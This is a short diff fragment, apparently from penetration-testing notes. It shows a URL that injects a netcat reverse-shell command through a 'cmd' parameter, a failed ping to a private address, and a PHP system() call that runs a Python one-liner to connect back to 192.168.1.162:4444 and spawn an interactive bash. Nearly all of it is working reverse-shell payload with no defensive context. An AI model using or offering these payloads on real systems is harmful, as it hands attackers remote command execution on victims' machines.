@@ -26,6 +26,10 @@ http://192.168.1.1/test?cmd=nc%20192.168.1.163%205555%20-e%20/bin/sh
 
 
 
+PING 192.168.1.162 (192.168.1.162) 56(84) bytes of data. --- 192.168.1.162 ping statistics --- 4 packets transmitted, 0 received, 100% packet loss, time 3024ms 
+
+
+
 
 <?php
 system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.162\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'");
